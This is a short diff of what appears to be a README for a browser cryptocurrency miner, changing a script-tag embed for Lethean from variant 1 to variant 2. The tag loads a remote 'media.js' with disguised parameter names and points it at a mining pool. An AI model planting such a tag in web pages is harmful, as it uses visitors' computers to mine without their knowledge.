@@ -13,7 +13,7 @@ Attention: IPBC created their own PoW variant....so mining is disabled for the m
 ```
 #### Attention: Special Case for some custom variant fork coins: Lethean (formerly IntenseCoin) need ?algo=cn?variant=2<br> 
 ```sh
-<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=pool.intensecoin.com:3333" > </script>
+<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=2?jason=pool.intensecoin.com:3333" > </script>
 ```
 #### Attention: Special Case for some custom variant fork coins: Graft need ?algo=cn?variant=1<br> 
 ```sh
